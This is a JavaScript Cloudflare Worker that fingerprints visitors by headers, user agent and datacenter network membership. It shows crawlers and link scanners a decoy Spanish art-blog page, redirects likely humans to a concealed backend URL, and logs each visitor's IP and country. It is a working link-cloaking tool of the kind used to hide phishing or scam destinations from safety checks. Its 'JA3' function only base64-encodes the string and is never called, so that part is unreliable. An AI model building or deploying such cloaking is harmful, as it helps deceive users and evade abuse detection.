function calculateJA3(tlsInfo) {
  if (!tlsInfo) return null;
  
  const {
    tlsVersion,
    cipherSuites,
    extensions,
    supportedGroups,
    ecPointFormats
  } = tlsInfo;
  
  const ja3String = [
    tlsVersion,
    cipherSuites?.join('-') || '',
    extensions?.join('-') || '',
    supportedGroups?.join('-') || '',
    ecPointFormats?.join('-') || ''
  ].join(',');
  
  return btoa(ja3String).substring(0, 32);
}

function analyzeHeaders(request) {
  const headers = {};
  const headerOrder = [];
  
  for (const [key, value] of request.headers) {
    headers[key.toLowerCase()] = value;
    headerOrder.push(key.toLowerCase());
  }
  
  return {
    headers,
    order: headerOrder.join(':'),
    count: headerOrder.length,
    hasAcceptLanguage: !!headers['accept-language'],
    hasReferer: !!headers['referer'],
    hasSecFetch: !!headers['sec-fetch-site'],
    hasClientHints: !!headers['sec-ch-ua'],
    userAgent: headers['user-agent'] || ''
  };
}

function calculateRiskScore(headerAnalysis, country, isDatacenter) {
  let score = 50;
  
  if (headerAnalysis.hasAcceptLanguage) score += 10;
  if (headerAnalysis.hasReferer) score += 5;
  if (headerAnalysis.hasSecFetch) score += 15;
  if (headerAnalysis.hasClientHints) score += 10;
  
  if (headerAnalysis.count > 8) score += 10;
  if (headerAnalysis.count < 5) score -= 20;
  
  const ua = headerAnalysis.userAgent.toLowerCase();
  if (!ua || ua.includes('bot') || ua.includes('crawler') || ua.includes('spider')) {
    score -= 30;
  }
  if (ua.includes('chrome') || ua.includes('firefox') || ua.includes('safari')) {
    score += 10;
  }
  
  if (isDatacenter) score -= 20;
  
  return Math.max(0, Math.min(100, score));
}

function generateBotResponse(url, title) {
  const imageId = Math.random().toString(36).substring(7);
  
  return `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title}</title>
  <meta name="description" content="Explorando creatividad y expresión artística en el mundo digital contemporáneo.">
  <meta property="og:title" content="${title}">
  <meta property="og:description" content="Descubre contenido inspirador sobre arte, fotografía y creatividad.">
  <meta property="og:image" content="https://picsum.photos/seed/${imageId}/1200/630">
  <meta property="og:type" content="article">
  <meta name="twitter:card" content="summary_large_image">
  <style>
    body { font-family: system-ui, -apple-system, sans-serif; line-height: 1.6; max-width: 800px; margin: 0 auto; padding: 40px 20px; color: #333; }
    h1 { color: #1a1a1a; margin-bottom: 0.5em; }
    .meta { color: #666; font-size: 0.9em; margin-bottom: 2em; }
    img { width: 100%; height: auto; border-radius: 8px; margin: 2em 0; }
    p { margin-bottom: 1.5em; }
  </style>
</head>
<body>
  <article>
    <h1>${title}</h1>
    <div class="meta">Publicado el ${new Date().toLocaleDateString('es-ES')}</div>
    <img src="https://picsum.photos/seed/${imageId}/800/500" alt="Featured image" loading="lazy">
    <p>El arte de la creatividad contemporánea nos invita a explorar nuevas formas de expresión y conexión. En un mundo digital en constante evolución, encontrar autenticidad y significado se convierte en un acto revolucionario.</p>
    <p>A través de la fotografía, el diseño y la expresión visual, los creadores contemporáneos están redefiniendo los límites del arte y la comunicación.</p>
    <p>La inspiración puede encontrarse en los lugares más inesperados: en la luz del atardecer, en las texturas urbanas, en las conversaciones cotidianas.</p>
  </article>
</body>
</html>`;
}

function generateUserRedirect(url) {
  return `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redireccionando...</title>
  <meta http-equiv="refresh" content="0; url=${url}">
  <script>
    window.location.replace("${url}");
  </script>
  <style>
    body { font-family: system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #000; color: #fff; text-align: center; }
    a { color: #fff; }
  </style>
</head>
<body>
  <div>
    <p>Redireccionando...</p>
    <p><a href="${url}">Haz clic aquí si no redirige automáticamente</a></p>
  </div>
</body>
</html>`;
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    if (path.startsWith('/api') || path.startsWith('/admin') || path === '/health') {
      return fetch(request);
    }
    
    const slug = path.substring(1);
    if (!slug || slug.includes('.')) {
      return fetch(request);
    }
    
    const clientIP = request.headers.get('cf-connecting-ip') || 'unknown';
    const country = request.headers.get('cf-ipcountry') || 'unknown';
    const asn = request.cf?.asn;
    
    const knownDatacenterASNs = [15169, 8075, 16509, 14618, 14061, 63949];
    const isDatacenter = knownDatacenterASNs.includes(asn);
    
    const headerAnalysis = analyzeHeaders(request);
    const riskScore = calculateRiskScore(headerAnalysis, country, isDatacenter);
    
    ctx.waitUntil(logRequest(env, {
      slug,
      ip: clientIP,
      country,
      riskScore,
      userAgent: headerAnalysis.userAgent,
      timestamp: new Date().toISOString()
    }));
    
    if (riskScore >= 30) {
      return new Response(generateUserRedirect(`${env.BACKEND_URL}/${slug}`), {
        headers: {
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'no-store',
          'X-Risk-Score': riskScore.toString()
        }
      });
    } else {
      return new Response(generateBotResponse(url.toString(), 'Explorando la Creatividad Visual'), {
        headers: {
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'public, max-age=300',
          'X-Risk-Score': riskScore.toString()
        }
      });
    }
  }
};

async function logRequest(env, data) {
  try {
    if (env.ANALYTICS_KV) {
      const key = `log:${Date.now()}:${Math.random().toString(36).substr(2, 9)}`;
      await env.ANALYTICS_KV.put(key, JSON.stringify(data), {
        expirationTtl: 86400
      });
    }
  } catch (e) {}
}
